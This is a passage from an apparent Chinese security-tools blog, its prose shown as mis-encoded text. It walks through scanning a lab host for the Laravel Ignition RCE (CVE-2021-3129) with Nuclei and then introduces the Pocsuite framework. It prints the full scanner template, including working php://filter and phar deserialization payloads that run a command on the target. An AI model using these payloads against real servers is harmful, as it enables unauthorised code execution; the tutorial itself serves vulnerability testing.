ssl<span class="token punctuation">\</span>deprecated-tls.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="å®æˆ˜ä½¿ç”¨ï¼šä½¿ç”¨nucleiæ‰«ælaravelæ¡†æ¶çš„RCEæ¼æ´CVE-2021-3129-1"><a href="#å®æˆ˜ä½¿ç”¨ï¼šä½¿ç”¨nucleiæ‰«ælaravelæ¡†æ¶çš„RCEæ¼æ´CVE-2021-3129-1" class="headerlink" title="å®æˆ˜ä½¿ç”¨ï¼šä½¿ç”¨nucleiæ‰«ælaravelæ¡†æ¶çš„RCEæ¼æ´CVE-2021-3129"></a>å®æˆ˜ä½¿ç”¨ï¼šä½¿ç”¨nucleiæ‰«ælaravelæ¡†æ¶çš„RCEæ¼æ´CVE-2021-3129</h4><p>æ¨¡ç‰ˆä½ç½®ï¼šnuclei-templates/http/cves/2021/CVE-2021-3129.yaml</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-u</span> http://172.20.10.5:81/ <span class="token parameter variable">-t</span> http/cves/2021/CVE-2021-3129.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2011.40.46.png" style="zoom:50%;"><p>æˆåŠŸæ£€æµ‹åˆ°ç›®æ ‡æ¼æ´ã€‚</p></blockquote><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2011.42.33.png" style="zoom:50%;"><p>å¯ä»¥æ‰§è¡Œç»å¯¹ç›®å½•ä¹‹åtabé”®è¡¥è¶³æ¨¡ç‰ˆæ–‡ä»¶ã€‚</p><p>CVE-2021-3129.yamlçš„é…ç½®ï¼š</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">id</span><span class="token punctuation">:</span> CVE<span class="token punctuation">-</span>2021<span class="token punctuation">-</span><span class="token number">3129</span><span class="token key atrule">info</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> Laravel with Ignition &lt;= v8.4.2 Debug Mode <span class="token punctuation">-</span> Remote Code Execution  <span class="token key atrule">author</span><span class="token punctuation">:</span> z3bd<span class="token punctuation">,</span>pdteam  <span class="token key atrule">severity</span><span class="token punctuation">:</span> critical  <span class="token key atrule">description</span><span class="token punctuation">:</span> Laravel version 8.4.2 and before with Ignition before 2.5.2 allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.  <span class="token key atrule">impact</span><span class="token punctuation">:</span> <span class="token punctuation">|</span><span class="token scalar string">    Successful exploitation of this vulnerability can lead to remote code execution, potentially allowing an attacker to take control of the affected system.</span>  <span class="token key atrule">remediation</span><span class="token punctuation">:</span> <span class="token punctuation">|</span><span class="token scalar string">    Upgrade Laravel to version 8.4.3 or higher to mitigate this vulnerability.</span>  <span class="token key atrule">reference</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> https<span class="token punctuation">:</span>//www.ambionics.io/blog/laravel<span class="token punctuation">-</span>debug<span class="token punctuation">-</span>rce    <span class="token punctuation">-</span> https<span class="token punctuation">:</span>//github.com/vulhub/vulhub/tree/master/laravel/CVE<span class="token punctuation">-</span>2021<span class="token punctuation">-</span><span class="token number">3129</span>    <span class="token punctuation">-</span> https<span class="token punctuation">:</span>//nvd.nist.gov/vuln/detail/CVE<span class="token punctuation">-</span>2021<span class="token punctuation">-</span><span class="token number">3129</span>    <span class="token punctuation">-</span> https<span class="token punctuation">:</span>//github.com/facade/ignition/pull/334    <span class="token punctuation">-</span> https<span class="token punctuation">:</span>//github.com/d4n<span class="token punctuation">-</span>sec/d4n<span class="token punctuation">-</span>sec.github.io  <span class="token key atrule">classification</span><span class="token punctuation">:</span>    <span class="token key atrule">cvss-metrics</span><span class="token punctuation">:</span> CVSS<span class="token punctuation">:</span>3.1/AV<span class="token punctuation">:</span>N/AC<span class="token punctuation">:</span>L/PR<span class="token punctuation">:</span>N/UI<span class="token punctuation">:</span>N/S<span class="token punctuation">:</span>U/C<span class="token punctuation">:</span>H/I<span class="token punctuation">:</span>H/A<span class="token punctuation">:</span>H    <span class="token key atrule">cvss-score</span><span class="token punctuation">:</span> <span class="token number">9.8</span>    <span class="token key atrule">cve-id</span><span class="token punctuation">:</span> CVE<span class="token punctuation">-</span>2021<span class="token punctuation">-</span><span class="token number">3129</span>    <span class="token key atrule">epss-score</span><span class="token punctuation">:</span> <span class="token number">0.97461</span>    <span class="token key atrule">epss-percentile</span><span class="token punctuation">:</span> <span class="token number">0.99957</span>    <span class="token key atrule">cpe</span><span class="token punctuation">:</span> cpe<span class="token punctuation">:</span>2.3<span class="token punctuation">:</span>a<span class="token punctuation">:</span>facade<span class="token punctuation">:</span>ignition<span class="token punctuation">:</span><span class="token important">*:*:*:*:*:laravel:*:*</span>  <span class="token key atrule">metadata</span><span class="token punctuation">:</span>    <span class="token key atrule">max-request</span><span class="token punctuation">:</span> <span class="token number">6</span>    <span class="token key atrule">vendor</span><span class="token punctuation">:</span> facade    <span class="token key atrule">product</span><span class="token punctuation">:</span> ignition    <span class="token key atrule">framework</span><span class="token punctuation">:</span> laravel  <span class="token key atrule">tags</span><span class="token punctuation">:</span> cve2021<span class="token punctuation">,</span>cve<span class="token punctuation">,</span>laravel<span class="token punctuation">,</span>rce<span class="token punctuation">,</span>vulhub<span class="token punctuation">,</span>kev<span class="token punctuation">,</span>facade<span class="token key atrule">http</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token key atrule">raw</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token punctuation">|</span><span class="token scalar string">        POST /_ignition/execute-solution HTTP/1.1        Host: {{Hostname}}        Accept: application/json        Content-Type: application/json</span>        <span class="token punctuation">{</span><span class="token key atrule">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token key atrule">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token key atrule">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"cve20213129"</span><span class="token punctuation">,</span> <span class="token key atrule">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>      <span class="token punctuation">-</span> <span class="token punctuation">|</span><span class="token scalar string">        POST /_ignition/execute-solution HTTP/1.1        Host: {{Hostname}}        Accept: application/json        Content-Type: application/json</span>        <span class="token punctuation">{</span><span class="token key atrule">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token key atrule">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token key atrule">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"cve20213129"</span><span class="token punctuation">,</span> <span class="token key atrule">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>      <span class="token punctuation">-</span> <span class="token punctuation">|</span><span class="token scalar string">        POST /_ignition/execute-solution HTTP/1.1        Host: {{Hostname}}        Accept: application/json        Content-Type: application/json</span>        <span class="token punctuation">{</span><span class="token key atrule">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token key atrule">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token key atrule">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"cve20213129"</span><span class="token punctuation">,</span> <span class="token key atrule">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"AA"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>      <span class="token punctuation">-</span> <span class="token punctuation">|</span><span class="token scalar string">        POST /_ignition/execute-solution HTTP/1.1        Host: {{Hostname}}        Accept: application/json        Content-Type: application/json</span>        <span class="token punctuation">{</span><span class="token key atrule">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token key atrule">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token key atrule">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"cve20213129"</span><span class="token punctuation">,</span> <span class="token key atrule">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=4C=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=7A=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=45=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=56=00=6D=00=46=00=73=00=61=00=57=00=52=00=68=00=64=00=47=00=6C=00=76=00=62=00=6C=00=78=00=57=00=59=00=57=00=78=00=70=00=5A=00=47=00=46=00=30=00=62=00=33=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=6D=00=56=00=34=00=64=00=47=00=56=00=75=00=63=00=32=00=6C=00=76=00=62=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=63=00=7A=00=6F=00=77=00=4F=00=69=00=49=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=33=00=4D=00=36=00=4D=00=6A=00=6F=00=69=00=61=00=57=00=51=00=69=00=4F=00=33=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=58=00=73=00=7A=00=6F=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=58=00=73=00=7A=00=6F=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=7A=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=51=00=63=00=4A=00=39=00=59=00=36=00=5A=00=6B=00=50=00=61=00=39=00=61=00=45=00=49=00=51=00=49=00=45=00=47=00=30=00=6B=00=4A=00=2B=00=39=00=4A=00=50=00=6B=00=4C=00=67=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>      <span class="token punctuation">-</span> <span class="token punctuation">|</span><span class="token scalar string">        POST /_ignition/execute-solution HTTP/1.1        Host: {{Hostname}}        Accept: application/json        Content-Type: application/json</span>        <span class="token punctuation">{</span><span class="token key atrule">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token key atrule">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token key atrule">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"cve20213129"</span><span class="token punctuation">,</span> <span class="token key atrule">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>      <span class="token punctuation">-</span> <span class="token punctuation">|</span><span class="token scalar string">        POST /_ignition/execute-solution HTTP/1.1        Host: {{Hostname}}        Accept: application/json        Content-Type: application/json</span>        <span class="token punctuation">{</span><span class="token key atrule">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token key atrule">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token key atrule">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"cve20213129"</span><span class="token punctuation">,</span> <span class="token key atrule">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"phar://../storage/logs/laravel.log/test.txt"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token key atrule">matchers-condition</span><span class="token punctuation">:</span> and    <span class="token key atrule">matchers</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> word        <span class="token key atrule">part</span><span class="token punctuation">:</span> body        <span class="token key atrule">words</span><span class="token punctuation">:</span>          <span class="token punctuation">-</span> <span class="token string">"uid="</span>          <span class="token punctuation">-</span> <span class="token string">"gid="</span>          <span class="token punctuation">-</span> <span class="token string">"groups="</span>          <span class="token punctuation">-</span> <span class="token string">"Illuminate"</span>        <span class="token key atrule">condition</span><span class="token punctuation">:</span> and      <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> status        <span class="token key atrule">status</span><span class="token punctuation">:</span>          <span class="token punctuation">-</span> <span class="token number">500</span>    <span class="token key atrule">extractors</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> regex        <span class="token key atrule">regex</span><span class="token punctuation">:</span>          <span class="token punctuation">-</span> <span class="token string">"(u|g)id=.*"</span><span class="token comment"># digest: 490a004630440220061e1cccf77831c543906f6cd87272aba03f3bc9d9978646f1f32e9bc009697402200ad6ad4858c57e1d8ae24c45ec24ed9d980bf9eac4df9e25a4de70882bf64f83:922c64590222798bb761d5b6d8e72950</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-4-é’ˆå¯¹URLåˆ—è¡¨æ‰§è¡Œæ¨¡ç‰ˆ"><a href="#3-3-4-é’ˆå¯¹URLåˆ—è¡¨æ‰§è¡Œæ¨¡ç‰ˆ" class="headerlink" title="3.3.4 é’ˆå¯¹URLåˆ—è¡¨æ‰§è¡Œæ¨¡ç‰ˆ"></a>3.3.4 é’ˆå¯¹URLåˆ—è¡¨æ‰§è¡Œæ¨¡ç‰ˆ</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuclei <span class="token parameter variable">-list</span> http_urls.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-4-ç»“æœä»ªè¡¨ç›˜"><a href="#3-4-ç»“æœä»ªè¡¨ç›˜" class="headerlink" title="3.4 ç»“æœä»ªè¡¨ç›˜"></a>3.4 ç»“æœä»ªè¡¨ç›˜</h2><p>Nuclei ç°åœ¨å…è®¸ä¸ ProjectDiscovery äº‘å¹³å°æ— ç¼é›†æˆï¼Œä»¥ç®€åŒ– Nuclei ç»“æœçš„å¯ç¥åŒ–å¹¶å¿«é€Ÿç”ŸæˆæŠ¥å‘Šã€‚</p><p>è¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è®¾ç½® PDCP ç»“æœä»ªè¡¨æ¿ï¼š</p><ul><li>1ã€è®¿é—®<a href="https://cloud.projectdiscovery.io/">https://cloud.projectdiscovery.io</a> ä»¥åˆ›å»ºå…è´¹çš„ PDCP API å¯†é’¥</li></ul><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2013.19.25.png" style="zoom:50%;"><p>ç‚¹å‡»<code>API key</code>æŸ¥çœ‹ä¸“å±çš„API Key</p><ul><li>2ã€ä½¿ç”¨å‘½ä»¤nuclei -authï¼Œåœ¨å‡ºç°æç¤ºæ—¶è¾“å…¥æ‚¨çš„ AP1å¯†é’¥ã€‚</li></ul><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2013.21.33.png" style="zoom:50%;"><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2013.22.17.png" style="zoom:50%;"><p>è®¤è¯æˆåŠŸã€‚</p><ul><li>3ã€ä¹‹åè¦æ‰§è¡Œæ‰«æå¹¶å°†ç»“æœç›´æ¥ä¸Šä¼ åˆ°äº‘ç«¯ï¼Œåœ¨è¿è¡Œæ‰«ææ—¶ä½¿ç”¨<code>-cloud-upload</code>é€‰é¡¹ã€‚</li></ul><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2013.25.01.png" style="zoom:50%;"><p>ä¾‹å¦‚è¿™é‡Œçš„ç»“æœè®¿é—®é“¾æ¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://cloud.projectdiscovery.io/scans/cu7iv6i804ic73fv90rg?team_id<span class="token operator">=</span>none<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/21/gong-fang-gong-ju-ku/nuclei-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-21%2013.27.28.png" style="zoom:80%;"><h1 id="å››ã€è‡ªç ”"><a href="#å››ã€è‡ªç ”" class="headerlink" title="å››ã€è‡ªç ”"></a>å››ã€è‡ªç ”</h1><p>ProjectDiscovery äº‘å¹³å° API v1 å›½ç»• REST è¿›è¡Œç»„ç»‡ã€‚AP1 å…·æœ‰é¢å‘èµ„æºçš„URLï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æ¥å—å’Œè¿”å› JSONï¼Œå¹¶ä¸” APIä½¿ç”¨æ ‡æ·®çš„HTTP å“åº”ä»£ç ã€èº«ä»½éªŒè¯å’ŒåŠ¨è¯ã€‚è¿™ç»™äº†æˆ‘ä»¬è‡ªç ”æ‰«æè¡Œä¸ºå¾ˆå¤§çš„æ”¯æŒï¼š</p><p>æ–‡æ¡£ï¼š<a href="https://docs.projectdiscovery.io/api-reference/introduction">https://docs.projectdiscovery.io/api-reference/introduction</a></p><h1 id="äº”ã€æ¨¡ç‰ˆç¼–è¾‘å™¨"><a href="#äº”ã€æ¨¡ç‰ˆç¼–è¾‘å™¨" class="headerlink" title="äº”ã€æ¨¡ç‰ˆç¼–è¾‘å™¨"></a>äº”ã€æ¨¡ç‰ˆç¼–è¾‘å™¨</h1><p><a href="https://cloud.projectdiscovery.io/templates">https://cloud.projectdiscovery.io/templates</a></p><p>Nuclei Template Ecitor æ˜¯ä¸€æ¬¾å¤šåŠŸèƒ½äº‘æ‰˜ç®¡å·¥å…·ï¼Œä¸“ä¸ºåˆ›å»ºã€è¿è¡Œå’Œå…±äº«Nuclei æ¨¡æ¿è€Œè®¾è®¡ã€‚å®ƒä¸ºå¯»æ±‚ç®¡ç†å’Œæ‰§è¡Œæ¨¡æ¿çš„ä¸ªäººå’Œä¸“ä¸šç”¨æˆ·æä¾›äº†æœ‰ç”¨çš„åŠŸèƒ½</p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li>ï»¿ï»¿å•å‡»â€åˆ›å»ºæ–°æ¨¡æ¿â€æŒ‰é’®ä»¥æ‰“å¼€ä¸€ä¸ªæ–°çš„ç¼–è¾‘å™¨</li><li>ï»¿ï»¿ç¼–å†™å’Œä¿®æ”¹æ¨¡æ¿ã€‚ç¼–è¾‘å™¨åˆ©ç”¨è¯­æ³•çªå‡ºæ˜¾ç¤ºã€ç‰‡æ®µå»ºè®®ç­‰å·¥å…·æ¥ç®€åŒ–å†™ä½œè¿‡ç¨‹</li><li>ç¼–å†™å®Œæ¨¡æ¿åï¼Œè¾“å…¥æµ‹è¯•ç›®æ ‡ï¼Œç„¶åå•å‡»â€œæ‰«æâ€æŒ‰é’®ä»¥éªŒè¯æ¨¡æ¿çš„å‡†ç¡®æ€§</li><li>ä¹Ÿå¯ä»¥ç‚¹å‡»shareåˆ†äº«ä½ ç¼–å†™çš„æ¨¡æ¿</li></ol><h1 id="å®˜æ–¹æ–‡æ¡£"><a href="#å®˜æ–¹æ–‡æ¡£" class="headerlink" title="å®˜æ–¹æ–‡æ¡£"></a>å®˜æ–¹æ–‡æ¡£</h1><p><a href="https://docs.projectdiscovery.io/cloud/introduction">https://docs.projectdiscovery.io/cloud/introduction</a></p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> æ¼æ´æ‰«æ </tag>
            
            <tag> nuclei </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pocsuiteæ¸—é€æ¡†æ¶</title>
      <link href="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/"/>
      <url>/2025/01/20/gong-fang-gong-ju-ku/pocsuite/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Pocsuiteç®€ä»‹"><a href="#ä¸€ã€Pocsuiteç®€ä»‹" class="headerlink" title="ä¸€ã€Pocsuiteç®€ä»‹"></a>ä¸€ã€Pocsuiteç®€ä»‹</h1><p>Pocsuite æ˜¯ç”±çŸ¥é“åˆ›å®‡ 404 å®éªŒå®¤å¼€å‘çš„ä¸€æ¬¾å¼€æºçš„è¿œç¨‹æ¼æ´æµ‹è¯•æ¡†æ¶ï¼Œè‡ª 2015 å¹´å¼€æºä»¥æ¥ä¸€ç›´ç”±è¯¥å›¢é˜ŸæŒç»­ç»´æŠ¤ã€‚å®ƒåŸºäº Python 3 ç¼–å†™ï¼Œæ”¯æŒ Windowsã€Linuxã€Mac OS X ç­‰å¤šç§æ“ä½œç³»ç»Ÿã€‚</p><h2 id="1-1-ä¸»è¦åŠŸèƒ½"><a href="#1-1-ä¸»è¦åŠŸèƒ½" class="headerlink" title="1.1 ä¸»è¦åŠŸèƒ½"></a>1.1 ä¸»è¦åŠŸèƒ½</h2><ul><li><strong>æ¼æ´æµ‹è¯•æ¡†æ¶</strong><br>Pocsuite æ”¯æŒéªŒè¯ï¼ˆverifyï¼‰ã€æ”»å‡»ï¼ˆattackï¼‰å’Œäº¤äº’å¼ shellï¼ˆshellï¼‰ä¸‰ç§æ¨¡å¼ï¼Œå¯ä»¥æŒ‡å®šå•ä¸ªç›®æ ‡æˆ–ä»æ–‡ä»¶å¯¼å…¥å¤šä¸ªç›®æ ‡ï¼Œä½¿ç”¨å•ä¸ª PoC æˆ– PoC é›†åˆè¿›è¡Œæ¼æ´éªŒè¯æˆ–åˆ©ç”¨ã€‚å®ƒè¿˜æ”¯æŒå‘½ä»¤è¡Œæ¨¡å¼å’Œç±»ä¼¼ Metasploit çš„äº¤äº’æ¨¡å¼ã€‚</li><li><strong>PoC/Exp å¼€å‘æ¡†æ¶</strong><br>Pocsuite æä¾›äº†åŸºç¡€çš„ PoC ç±»å’Œå¸¸ç”¨æ–¹æ³•ï¼ˆå¦‚ Webshell ç›¸å…³æ–¹æ³•ï¼‰ï¼Œå¼€å‘è€…åªéœ€ç¼–å†™æ¼æ´éªŒè¯çš„æ ¸å¿ƒä»£ç ã€‚åŸºäº Pocsuite ç¼–å†™çš„ PoC/Exp å¯ä»¥ç›´æ¥è¢«æ¡†æ¶ä½¿ç”¨ã€‚</li><li><strong>å¯é›†æˆæ¨¡å—</strong><br>Pocsuite å¯ä»¥ä½œä¸º Python åŒ…è¢«é›†æˆåˆ°å…¶ä»–æ¼æ´æµ‹è¯•å·¥å…·ä¸­ï¼Œæ”¯æŒäºŒæ¬¡å¼€å‘ã€‚</li><li><strong>é›†æˆå®‰å…¨æœåŠ¡</strong><br>å®ƒé›†æˆäº† ZoomEyeã€Seebugã€Ceyeã€Shodan ç­‰å®‰å…¨æœåŠ¡çš„ APIï¼Œå¯ä»¥æ‰¹é‡è·å–æµ‹è¯•ç›®æ ‡ã€è¯»å– PoC æˆ–éªŒè¯ç›²æ‰“çš„ DNS å’Œ HTTP è¯·æ±‚ã€‚</li></ul><h1 id="äºŒã€å®‰è£…æ–¹æ³•"><a href="#äºŒã€å®‰è£…æ–¹æ³•" class="headerlink" title="äºŒã€å®‰è£…æ–¹æ³•"></a>äºŒã€å®‰è£…æ–¹æ³•</h1><h2 id="2-1-ä½¿ç”¨-Python3-pip-å®‰è£…"><a href="#2-1-ä½¿ç”¨-Python3-pip-å®‰è£…" class="headerlink" title="2.1 ä½¿ç”¨ Python3 pip å®‰è£…"></a>2.1 ä½¿ç”¨ Python3 pip å®‰è£…</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> pocsuite3<span class="token comment"># ä½¿ç”¨å›½å†…é•œåƒåŠ é€Ÿ</span>pip3 <span class="token function">install</span> <span class="token parameter variable">-i</span> https://pypi.tuna.tsinghua.edu.cn/simple pocsuite3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-åœ¨-MacOS-ä¸Šå®‰è£…"><a href="#2-2-åœ¨-MacOS-ä¸Šå®‰è£…" class="headerlink" title="2.2 åœ¨ MacOS ä¸Šå®‰è£…"></a>2.2 åœ¨ MacOS ä¸Šå®‰è£…</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew updatebrew info pocsuite3brew <span class="token function">install</span> pocsuite3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Homebrewçš„å®‰è£…å‚è€ƒï¼š<a href="https://brew.idayer.com/guide/start">https://brew.idayer.com/guide/start</a></p><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-21%2009.05.00.png" style="zoom:50%;"><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-21%2009.06.47.png" style="zoom:50%;"><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-21%2009.10.59.png" style="zoom:50%;"><h2 id="2-3-Debian-Ubuntu-kali"><a href="#2-3-Debian-Ubuntu-kali" class="headerlink" title="2.3 Debian/Ubuntu/kali"></a>2.3 Debian/Ubuntu/kali</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> pocsuite3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-20%2017.13.02.png" style="zoom:50%;"><h2 id="2-4-Docker"><a href="#2-4-Docker" class="headerlink" title="2.4 Docker"></a>2.4 Docker</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-it</span> pocsuite3/pocsuite3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-5-æºç å®‰è£…"><a href="#2-5-æºç 